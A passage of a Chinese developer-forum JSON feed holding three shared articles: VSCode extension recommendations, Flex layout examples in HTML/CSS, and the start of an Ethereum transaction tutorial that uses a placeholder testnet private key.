src=\"https://image.fundebug.com/2018-12-17-01.gif\" alt></p>\n<p>安装此<a href=\"https://marketplace.visualstudio.com/items?itemName=WallabyJs.quokka-vscode\">扩展</a>后，可以按Ctrl / Cmd（⌘）+ Shift + P显示编辑器的命令选项板，然后键入 Quokka 以查看可用命令的列表。选择并运行 “New JavaScript File”命令。你也可以按（⌘+ K + J）直接打开文件。在此文件中输入的任何内容都会立即执行。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-02.gif\" alt></p>\n<p>Quokka.js类似的扩展 –</p>\n<ul>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.code-runner\">Code Runner</a> – 支持多种语言，如C，C ++，Java，JavaScript，PHP，Python，Perl，Perl 6等。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=mattn.Runner\">Runner</a></li>\n</ul>\n<h3>括号配对着色(Bracket Pair Colorizer) 和 彩虹缩进(Indent Rainbow)</h3>\n<p>花括号和圆括号是许多编程语言不可分割的部分，在 JavaScript 等语言中，在一屏代码中花括号和园括号可能有多层嵌套，有些括号不太容易识别哪个对应哪个，然而却没有简单的方法来识别这些括号前后的对应关系。</p>\n<p><a href=\"https://marketplace.visualstudio.com/items?itemName=CoenraadS.bracket-pair-colorizer\">括号配对着色(Bracket Pair Colorizer)</a> 和 <a href=\"https://marketplace.visualstudio.com/items?itemName=oderwat.indent-rainbow\">彩虹缩进(Indent Rainbow)</a>。这是两个不同的扩展。然而，他们就像是一对情侣，可以完美的配合使用。这些扩展将为你的编辑器添加一系列颜色，并使代码块易于辨别，一旦你习惯了它们，如果 VSCode 没有它们就会让人觉得很平淡。</p>\n<p><strong>不使用括号配对着色(Bracket Pair Colorizer) 和 彩虹缩进(Indent Rainbow)</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-03.png\" alt></p>\n<p><strong>使用括号配对着色(Bracket Pair Colorizer) 和 彩虹缩进(Indent Rainbow)后</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-04.png\" alt></p>\n<h3>snippets(代码片段)</h3>\n<p>代码片段是编辑器中的短代码。因此，可以输入 imr 并按Tab 来展开该代码片段，而不是’import React from '。类似地，clg 变成了 console.log。</p>\n<p>各种各样的框架和类库都有很多代码片段：Javascript，React，Redux，Angular，Vue，Jest。 我个人认为 Javascript 代码片段非常有用，因为我主要使用 JS 。</p>\n<p>一些很好的代码片段扩展 –</p>\n<ul>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=xabikos.JavaScriptSnippets\">JavaScript (ES6) code snippets</a></li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=EQuimper.react-native-react-redux\">React-Native/React/Redux snippets for es6/es7</a></li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=TimonVS.ReactSnippetsStandard\">React Standard Style code snippets</a></li>\n</ul>\n<h3>TODO高亮</h3>\n<p>通常在进行编码时，你认为可能有更好的方法来执行相同的操作。这时你留下注释// TODO: 需要重构 或其他相关的东西。但是你很容易忘记了这个注释，并将你的代码推送到主版本库(master) 或者生产环境(production)。 但是你如果使用 Todo Highlighter（高亮），它会高亮的显示并让你容易看到这个注释。</p>\n<p>它以明亮的颜色突出代码中的 “TODO/FIXME” 或代码任何其他注释，以便始终清晰可见。另外还有一个很好的功能是 <code>List Highlighted annotations</code> ，它会在控制台中列出了所有 TODO。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-05.png\" alt></p>\n<p>使用 Todo Highlighter（高亮）类似的扩展 –</p>\n<ul>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=fabiospampinato.vscode-todo-plus\">Todo+</a> —  更强大的 Todo 高亮扩展，具有更多功能。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=minhthai.vscode-todo-parser\">Todo Parser</a></li>\n</ul>\n<h3>Import Cost</h3>\n<p>该<a href=\"https://marketplace.visualstudio.com/items?itemName=wix.vscode-import-cost\">扩展</a>允许您查看导入模块的大小，它对 Webpack 中的 bundlers 有很大帮助，你可以查看是导入整个库还是只导入特定的实用程序。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-06.png\" alt></p>\n<h3>REST Client</h3>\n<p>作为 web 开发人员，我们经常需要使用 REST api。为了检查url和检查响应，使用了 Postman 之类的工具。但是，既然编辑器可以轻松地完成相同的任务，为什么还要使用不同的应用程序呢? <a href=\"https://marketplace.visualstudio.com/items?itemName=humao.rest-client\">REST Client</a> 它允许你发送 HTTP 请求并直接在 Visual Studio 代码中查看响应。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-07.gif\" alt></p>\n<h3>自动闭合标记(Auto Close Tag)和自动重命名标记(Auto Rename Tag)</h3>\n<p>自从React的出现以及它在过去几年获得的吸引力以来，以 JSX 形式出现的类似 html 的语法现在非常流行。我们还必须使用 JavaScript 标签进行编码。任何web开发人员都会告诉你，输入标签是一件痛苦的事情。在大多数情况下，我们需要一个能够快速、轻松地生成标签及其子标签的工具。<a href=\"https://emmet.io/\">Emmet</a> 是 VSCode 中一个很好的例子，然而，有时候，你只是想要一些简单明了的东西。例如自动更新标签，它在你输入开始标签时自动生成结束标签。当你更改相同的标签时，关闭标记会自动更改，这两个扩展就是这样做的。</p>\n<p>它还适用于JSX和许多其他语言，如XML，PHP，Vue，JavaScript，TypeScript，TSX。</p>\n<p>在这里获取这两个扩展 – <a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag\">自动闭合标记(Auto Close Tag)</a> 和 <a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-rename-tag\">自动重命名标记(Auto Rename Tag)</a>。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-08.gif\" alt></p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-09.gif\" alt></p>\n<p>类似的扩展 –</p>\n<ul>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-complete-tag\">Auto Complete Tag</a> —  结合自动重命名和自动闭合标记的功能。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=Compulim.compulim-vscode-closetag\">Close HTML/XML tag</a></li>\n</ul>\n<h3>GitLens</h3>\n<p>正如其作者所说，GitLens 增强了 Visual Studio Code 中内置的 Git 功能，它包含了许多强大的功能，例如通过跟踪代码显示的代码作者，提交搜索，历史记录和GitLens资源管理器。你可以在<a href=\"https://github.com/eamodio/vscode-gitlens\">此处</a>阅读这些功能的完整说明。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-10.gif\" alt></p>\n<p>类似的扩展 –</p>\n<ul>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=donjayamanne.githistory\">Git History</a> — 显示提交历史的精美图表等等。推荐。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=waderyan.gitblame\">Git Blame</a>  — 它允许您在状态栏中查看当前所选行的Git Blame信息。 GitLens也提供了类似的功能。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=lamartire.git-indicators\">Git Indicators</a> — 它允许你查看受影响的文件以及状态栏中添加或删除的行数。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=ziyasal.vscode-open-in-github\">Open in GitHub / Bitbucket / Gitlab / VisualStudio.com !</a> — 它允许您使用单个命令在浏览器中打开repo。</li>\n</ul>\n<h3>Git项目管理器(Git Project Manager,GPM)</h3>\n<p>Git项目管理器(Git Project Manager,GPM)允许你直接从 VSCode 窗口打开一个针对Git存储库的新窗口。 基本上，你可以打开另一个存储库而无需离开VSCode。</p>\n<p>安装此扩展后，您必须将 gitProjectManager.baseProjectsFolders 设置为包含 repos 的URL列表。例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n    &quot;gitProjectManager.baseProjectsFolders&quot;: [\n        &quot;&#x2F;home&#x2F;user&#x2F;nodeProjects&quot;,\n        &quot;&#x2F;home&#x2F;user&#x2F;personal&#x2F;pocs&quot;\n    ]\n} \n</code></pre><p><img src=\"https://image.fundebug.com/2018-12-17-11.gif\" alt></p>\n<p>类似的扩展 –</p>\n<p><a href=\"https://marketplace.visualstudio.com/items?itemName=alefragnani.project-manager\">Project Manager</a> – 我没有亲自使用它，但它有百万+安装。所以建议你一定要看一下。</p>\n<h3>Indenticator(缩进指示器)</h3>\n<p><a href=\"https://marketplace.visualstudio.com/items?itemName=SirTori.indenticator\">它</a>在视觉上突出显示当前的缩进个数，因此，你可以轻松区分在不同级别缩进的各种代码块。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-12.gif\" alt></p>\n<h3>VSCode Icons</h3>\n<p>使您的编辑更具吸引力的图标！</p>\n<p><img src alt=\"13\"></p>\n<p>类似的扩展 –</p>\n<ul>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=emmanuelbeziat.vscode-great-icons\">VSCode Great Icons</a></li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=jtlowe.vscode-icon-theme\">Studio Icons</a></li>\n</ul>\n<h3>Dracula (Theme)</h3>\n<p><a href=\"https://marketplace.visualstudio.com/items?itemName=dracula-theme.theme-dracula\">Dracula</a> 是我最喜欢的主题。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-17-14.png\" alt></p>\n<p>我们可以使用快捷键来快速的选择更换主题；</p>\n<p>首先：按下 Ctrl + k</p>\n<p>然后再按下：Ctrl + t</p>\n<h3>其它推荐</h3>\n<ul>\n<li><a href=\"https://github.com/tonsky/FiraCode\">Fira Code</a> — 带编程连体字的等宽字体。 愚人码头注：clone 项目后，找到 ttf 文件夹，然后安装该文件夹中的字体文件。重新启动 VSCode ，选择TOOLS -&gt; Options -&gt; Fonts and Colors ，选择 Fira Code 即可。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer\">Live Server</a> — 一个具有静态和动态页面的实时重新加载功能的本地开发服务器。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=EditorConfig.EditorConfig\">EditorConfig for VS Code</a> – 此插件尝试使用.editorconfig文件中的设置覆盖用户/工作区设置，不需要其他或特定于 vscode 的文件。与任何EditorConfig插件一样，如果未指定root = true，EditorConfig将继续在项目外部查找.editorconfig文件。</li>\n<li><a href=\"https://github.com/prettier/prettier-vscode\">Prettier for VSCode</a> — 一个代码格式化工具。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=alefragnani.Bookmarks\">Bookmarks</a> – 它可以帮助您在代码中导航，轻松快速地在重要位置之间移动。不再需要搜索代码，它还支持一组选择命令，允许您选择书签线和书签线之间的区域，它对日志文件分析非常有用。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=christian-kohler.path-intellisense\">Path Intellisense</a> — Visual Studio Code插件，可自动填充文件名。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=pflannery.vscode-versionlens\">Version Lens</a> — 在Visual Studio代码编辑器中显示npm，jspm，bower，dub和dotnet核心的软件包版本信息。</li>\n</ul>\n<p>开发中可能存在的bug没法实时知道，事后为了解决这些bug，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具<a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</p>\n<p><strong>原文：<a href=\"https://codeburst.io/top-java\">https://codeburst.io/top-java</a>…</strong></p>\n<p><strong>你的点赞是我持续分享好东西的动力，欢迎点赞！</strong></p>\n<p><strong>一个笨笨的码农，我的世界只能终身学习！</strong></p>\n<p>**更多内容请关注公众号《大迁世界》！</p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，得到了Google、360、金山软件、百姓网等众多知名用户的认可。欢迎免费试用！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"提高 JavaScript 开发效率的高级 VSCode 扩展！","last_reply_at":"2018-12-18T00:44:18.673Z","good":false,"top":false,"reply_count":2,"visit_count":1008,"create_at":"2018-12-17T03:16:34.016Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c1776baf3d48d2397c121b2","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>本文将通过三个简单的实例，实际应用上篇文章的基础理论知识，展示下Flex布局是如何解决CSS布局问题。</p>\n<h1>一．垂直居中</h1>\n<p>这里同时用非flex布局和flex布局两种方式来实现，可以对比两种实现方式的差异。</p>\n<h2>1.1用margin实现垂直居中</h2>\n<p>实现方式：</p>\n<p>父元素采用相对定位，子元素采用绝对定位，先将元素的定点定位到父元素的中心，再使用margin负值法，即子元素自身宽度、高度的一半，将其拉回到父元素的中心。</p>\n<p>实现效果：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/2221081/1kxlpp4epq.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>附上完整代码：</p>\n<pre class=\"prettyprint language-js\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;垂直居中--normal&lt;&#x2F;title&gt;\n    &lt;style type=&quot;text&#x2F;css&quot;&gt;\n        body {\n            margin: 0;\n            padding: 0;\n        }\n\n        .container {\n            width: 500px;\n            height: 300px;\n            margin: 80px;\n            border: 1px solid blue;\n\n            position: relative;\n        }\n\n        .item {\n            width: 300px;\n            height: 200px;\n            border: 1px solid red;\n\n            position: absolute;\n            left: 50%;\n            top: 50%;\n            margin-left: -150px;\n            margin-top: -100px;\n\n        }\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n    &lt;div class=&quot;container&quot;&gt;\n        &lt;div class=&quot;item&quot;&gt;&lt;&#x2F;div&gt;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;\n</code></pre><h2>1.2用flex实现垂直居中</h2>\n<p>实现方式：</p>\n<p>父元素启用flex布局（display:flex），同时设置主轴上居中对齐（justify-content:center）、交叉轴上居中对齐（align-items:center）。子元素不需要额外设置样式。</p>\n<p>实现效果：同上</p>\n<p>附上完整代码：</p>\n<pre class=\"prettyprint language-js\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;垂直居中--flex&lt;&#x2F;title&gt;\n    &lt;style type=&quot;text&#x2F;css&quot;&gt;\n        body {\n            margin: 0;\n            padding: 0;\n        }\n        .container{\n            width:500px;\n            height:300px;\n            margin:80px;\n            border:1px solid blue;\n\n            display:flex;\n            justify-content: center;\n            align-items: center;\n        }\n        .item{\n            width:300px;\n            height:200px;\n            border:1px solid red;\n        }\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n    &lt;div class=&quot;container&quot;&gt;\n        &lt;div class=&quot;item&quot;&gt;&lt;&#x2F;div&gt;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n</code></pre><h1>二．圣杯布局</h1>\n<h2>2.1 普通方式实现圣杯布局</h2>\n<p>在我之前的文章<a href=\"https://cloud.tencent.com/developer/article/1351068\">圣杯布局与双飞翼布局</a>中详细介绍过如何实现一个圣杯布局：</p>\n<p>(1)中间的三栏布局，这里采用margin负值法：两边两栏宽度固定，中间栏宽度自适应，左栏、右栏、中间栏向左浮动，左栏的margin-left设为-100%，中间栏的width设为100%，右栏的margin-left设为-右栏宽度。</p>\n<p>(2)给container设置padding-left和padding-right属性，值分别为左栏、右栏的宽度；</p>\n<p>(3)将左右两栏设置为相对定位，同时左栏的left值设为-左栏宽度，右栏的right设为-右栏宽度。</p>\n<p>实现效果：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/2221081/3mry0lpa2u.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>实现代码：</p>\n<pre class=\"prettyprint language-js\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;圣杯布局&lt;&#x2F;title&gt;\n    &lt;style type=&quot;text&#x2F;css&quot;&gt;\n        body {\n            margin: 0;\n            padding: 0;\n        }\n\n        header,\n        footer {\n            height: 100px;\n            width: 100%;\n            background-color: #bbbbbb;\n        }\n\n        .container {\n            height: 300px;\n            \n            &#x2F;* 圣杯布局 *&#x2F;\n            padding-left: 200px;\n            padding-right: 300px; \n        }\n\n        .container div{\n            float: left;\n            \n            &#x2F;* 圣杯布局 *&#x2F;\n            position:relative;\n        }\n\n        .left {\n            width: 200px;\n            height: 300px;\n            background-color: #DC698A;\n\n            margin-left: -100%;\n            &#x2F;* 圣杯布局 *&#x2F;\n            left:-200px;\n        }\n\n        .middle {\n            width: 100%;\n            height: 300px;\n            background-color: #3EACDD;\n\n        }\n\n        .right {\n            width: 300px;\n            height: 300px;\n            background-color: #8CB08B;\n    \n\n            margin-left: -300px;\n            &#x2F;* 圣杯布局 *&#x2F;\n            right:-300px;\n        }\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n    &lt;header&gt;头部&lt;&#x2F;header&gt;\n    &lt;div class=&quot;container&quot;&gt;\n        &lt;div class=&quot;middle&quot;&gt;中间栏：内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容&lt;&#x2F;div&gt;\n        &lt;div class=&quot;left&quot;&gt;左栏&lt;&#x2F;div&gt;\n        &lt;div class=&quot;right&quot;&gt;右栏&lt;&#x2F;div&gt;\n    &lt;&#x2F;div&gt;\n    &lt;footer&gt;底部&lt;&#x2F;footer&gt;\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;\n</code></pre><h2>2.2用flex实现圣杯布局</h2>\n<p>实现方式：</p>\n<p>(1)holyGrail启用flex布局，设置holyGrail中的header、container、footer在交叉轴上竖向排列（flex-direction:column;）</p>\n<p>(2)container中的三栏布局：container启用flex布局，设置container中的middle、left、right在主轴上横向排列（flex-direction:row，默认值可以不设）。由于html中先写的middle，所以为了让left在最左边，要设置left的order为这三栏中最小的，即-1（其他两栏order为默认值0）</p>\n<p>可以看出Flex布局的实现方式更加简单，也更加直观。</p>\n<p>实现效果：同上</p>\n<p>实现代码：</p>\n<pre class=\"prettyprint language-js\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;圣杯布局--flex&lt;&#x2F;title&gt;\n    &lt;style type=&quot;text&#x2F;css&quot;&gt;\n        body {\n            margin: 0;\n            padding: 0;\n        }\n        .holyGrail{\n            display: flex;\n            flex-direction: column;\n        }\n        header,\n        footer {\n            height: 100px;\n            width: 100%;\n            background-color: #bbbbbb;\n\n            flex: 1; &#x2F;*flex:1; === flex:1 1 auto;*&#x2F;\n        }\n\n        .container {\n            height: 300px;\n            \n            display: flex;\n            flex-direction: row;&#x2F;*可不写，默认值*&#x2F;\n            flex:1;&#x2F;*需要可自动扩展*&#x2F;\n        }\n\n\n        .left {\n            width: 200px;\n            height: 300px;\n            background-color: #DC698A;\n\n            order:-1;&#x2F;*左边栏放到最左边*&#x2F;\n        }\n\n        .middle {\n            width: 100%;\n            height: 300px;\n            background-color: #3EACDD;\n\n            flex:1;\n        }\n\n        .right {\n            width: 300px;\n            height: 300px;\n            background-color: #8CB08B;\n        }\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body class=&quot;holyGrail&quot;&gt;\n    &lt;header&gt;头部&lt;&#x2F;header&gt;\n    &lt;div class=&quot;container&quot;&gt;\n        &lt;div class=&quot;middle&quot;&gt;中间栏：内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容&lt;&#x2F;div&gt;\n        &lt;div class=&quot;left&quot;&gt;左栏&lt;&#x2F;div&gt;\n        &lt;div class=&quot;right&quot;&gt;右栏&lt;&#x2F;div&gt;\n    &lt;&#x2F;div&gt;\n    &lt;footer&gt;底部&lt;&#x2F;footer&gt;\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;\n</code></pre><h1>三.固定栏-可扩展栏页面布局</h1>\n<p>实现效果：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/2221081/j2mg3uwrr3.gif\" alt=\"img\"></p>\n<p>实现代码：</p>\n<pre class=\"prettyprint language-js\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;flex&lt;&#x2F;title&gt;\n    &lt;style type=&quot;text&#x2F;css&quot;&gt;\n        body {\n            margin: 0;\n            padding: 0;\n        }\n\n        .container {\n            width: 300px;\n            height: 200px;\n            border: 1px solid blue;\n\n            display: flex;\n            flex-direction: column;\n        }\n\n        .nav {\n            height: 50px;\n            background-color: grey;\n\n            display: flex;\n            flex-direction: row;\n        }\n\n        .nav-item {\n            min-width: 60px;\n            border: 1px solid orangered;\n        }\n\n        .main {\n            display: flex;\n            flex-direction: row;\n            flex: 1;\n            &#x2F;*main区域需要自动扩展*&#x2F;\n        }\n\n        .main-left {\n            width: 100px;\n            &#x2F;*main中的left区域固定*&#x2F;\n            background-color: #DC698A;\n        }\n\n        .main-right {\n            background-color: #3EACDD;\n            flex: 1;\n            &#x2F;*main中的right区域需要自动扩展*&#x2F;\n        }\n    &lt;&#x2F;style&gt;\n    &lt;script src=&quot;http:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.1.1.min.js&quot;&gt;&lt;&#x2F;script&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n    &lt;div class=&quot;container&quot;&gt;\n        &lt;div class=&quot;nav&quot;&gt;\n            &lt;div class=&quot;nav-item&quot;&gt;nav1&lt;&#x2F;div&gt;\n            &lt;div class=&quot;nav-item&quot;&gt;nav2&lt;&#x2F;div&gt;\n            &lt;div class=&quot;nav-item&quot;&gt;nav3&lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n        &lt;div class=&quot;main&quot;&gt;\n            &lt;div class=&quot;main-left&quot;&gt;固定栏：内容内容内容内容内容内容内容内容内容内容&lt;&#x2F;div&gt;\n            &lt;div class=&quot;main-right&quot;&gt;可扩展栏：内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容&lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;script type=&quot;text&#x2F;javascript&quot;&gt;\n    (function run() {\n        $(&quot;.container&quot;).animate({ width: 500, height: 300 }, 1500,\n            () =&gt; {\n                $(&quot;.container&quot;).animate({ width: 300, height: 200 }, 1500, run)\n            }\n        )\n    }());\n&lt;&#x2F;script&gt;\n\n&lt;&#x2F;html&gt;\n</code></pre><h1>四.小结</h1>\n<p>本文主要提供了三个实例，来实际应用下flex的属性。通过对比其他的实现方式，可以看出使用Flex布局可以优雅地实现相同的CSS布局问题。如有问题，欢迎指正。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n</div>","title":"CSS实例详解：Flex布局","last_reply_at":"2018-12-17T10:13:14.771Z","good":false,"top":false,"reply_count":0,"visit_count":522,"create_at":"2018-12-17T10:13:14.771Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c170b9b7ec239239ff576f6","author_id":"55ebd886de4de9a31454f9f6","tab":"share","content":"<div class=\"markdown-text\"><p>在以太坊交易中都发生了什么？以太坊可以被认为是基于交易的状态机，其中交易可以改变状态，并且状态跟踪交互。在这里，我们从高层次上检查交易的组成部分，并解释大多数乱码十六进制值是如何确定的。</p>\n<p>我们将在本教程中使用<code>nodejs</code>，因此我们首先安装依赖项。</p>\n<pre class=\"prettyprint\"><code>$ npm install web3@0.19 ethereumjs-util@4.4 ethereumjs-tx@1.3\n</code></pre><p>然后创建一个文件<code>tx.js</code>并要求依赖项。</p>\n<pre class=\"prettyprint\"><code>var Web3 = require(&#x27;web3&#x27;);\nvar web3 = new Web3(new Web3.providers.HttpProvider(&#x27;https:&#x2F;&#x2F;ropsten.infura.io&#x2F;&#x27;));\nvar util = require(&#x27;ethereumjs-util&#x27;);\nvar tx = require(&#x27;ethereumjs-tx&#x27;);\n</code></pre><p>首先，我们从一个私钥开始。以太坊使用<a href=\"https://en.wikipedia.org/wiki/Public-key_cryptography\">公钥加密</a>进行身份验证。更具体地，使用具有<a href=\"https://en.bitcoin.it/wiki/Secp256k1\">secp256k1</a>曲线的椭圆曲线数字签名算法（<a href=\"https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm\">ECDSA</a>）。除了一些<a href=\"http://ethereum.stackexchange.com/questions/1771/how-to-validate-a-private-key/2320\">限制</a>外，私钥只是一个随机的256位数据。例如：</p>\n<pre class=\"prettyprint\"><code>var privateKey = &#x27;0xc0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0de&#x27;;\n</code></pre><p>导出相应的公钥：</p>\n<pre class=\"prettyprint\"><code>var publicKey = util.bufferToHex(util.privateToPublic(privateKey));\n</code></pre><p>如果你打印出<code>publicKey</code>，你应该得到以下内容：</p>\n<pre class=\"prettyprint\"><code>0x4643bb6b393ac20a6175c713175734a72517c63d6f73a3ca90a15356f2e967da03d16431441c61ac69aeabb7937d333829d9da50431ff6af38536aa262497b27\n</code></pre><p>与该私钥相关联的以太坊地址是公钥的<a href=\"https://medium.com/%5B@ConsenSys%5D(/user/ConsenSys)/are-you-really-using-sha-3-or-old-code-c5df31ad2b0\">SHA3-256（Keccak）</a>哈希的最后160位。</p>\n<pre class=\"prettyprint\"><code>var address = &#x27;0x&#x27; + util.bufferToHex(util.sha3(publicKey)).slice(26);\n&#x2F;&#x2F;0x53ae893e4b22d707943299a8d0c844df0e3d5557\n</code></pre><p><img src=\"http://blog.hubwiz.com/2018/12/14/ethereum-translate-inside/1.png\" alt></p>\n<p>正如你所看到的，实际上多个私钥可能具有相同的地址。以太坊帐户与每个地址相关联，并且每个帐户都具有以下属性：</p>\n<ul>\n<li><code>nonce</code>从0开始的传出交易数的计数。</li>\n<li><code>balance</code>中的以太币数量。</li>\n<li><code>storageRoot</code>与帐户存储关联的哈希。</li>\n<li><code>codeHash</code>管理帐户的代码的哈希，如果这是空的，那么该帐户是可以使用其私钥访问的普通帐户，否则它是一个智能合约，其交互由其代码管理。</li>\n</ul>\n<p>接下来我们来看一个交易，有6个输入字段：</p>\n<ul>\n<li><code>nonce</code>从0开始的传出交易数的计数。</li>\n<li><code>gasPrice</code>价格确定交易将花费的以太量。</li>\n<li><code>gasLimit</code>允许用于处理交易的最大gas。</li>\n<li><code>to</code>交易发送到的帐户，如果为空，交易将创建合约。</li>\n<li>估计要发送的以太网的<code>value</code>。</li>\n<li><code>data</code>可以是对合约或代码的任意消息或函数调用以创建合约。</li>\n</ul>\n<p>发送1000wei（1ether =10的18次方wei）的ether并留下<code>0xc0de</code>消息的交易可以构造如下：</p>\n<pre class=\"prettyprint\"><code>var rawTx = {\n    nonce: web3.toHex(0),\n    gasPrice: web3.toHex(20000000000),\n    gasLimit: web3.toHex(100000),\n    to: &#x27;0x687422eEA2cB73B5d3e242bA5456b782919AFc85&#x27;,\n    value: web3.toHex(1000),\n    data: &#x27;0xc0de&#x27;\n};\n</code></pre><p>请注意，未指定发件人<code>from</code>地址，使用私钥签名后将从签名派生。签署交易：</p>\n<pre class=\"prettyprint\"><code>var p = new Buffer(&#x27;c0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0de&#x27;, &#x27;hex&#x27;);\nvar transaction = new tx(rawTx);\ntransaction.sign(p);\n</code></pre><p><img src=\"http://blog.hubwiz.com/2018/12/14/ethereum-translate-inside/2.png\" alt></p>\n<p>然后可以将交易发送到网络，并由256位交易id跟踪。此交易可在<a href=\"https://testnet.etherscan.io/tx/0x8b69a0ca303305a92d8d028704d65e4942b7ccc9a99917c8c9e940c9d57a9662\">Etherscan</a>查看。交易id是交易的哈希。</p>\n<pre class=\"prettyprint\"><code>console.log(util.bufferToHex(transaction.hash(true)));\n&#x2F;&#x2F;0x8b69a0ca303305a92d8d028704d65e4942b7ccc9a99917c8c9e940c9d57a9662\n</code></pre><p><img src=\"http://blog.hubwiz.com/2018/12/14/ethereum-translate-inside/3.png\" alt></p>\n<p>接下来，我们来看一下函数调用的数据<code>data</code>组成。以此交易的数据为例：</p>\n<pre 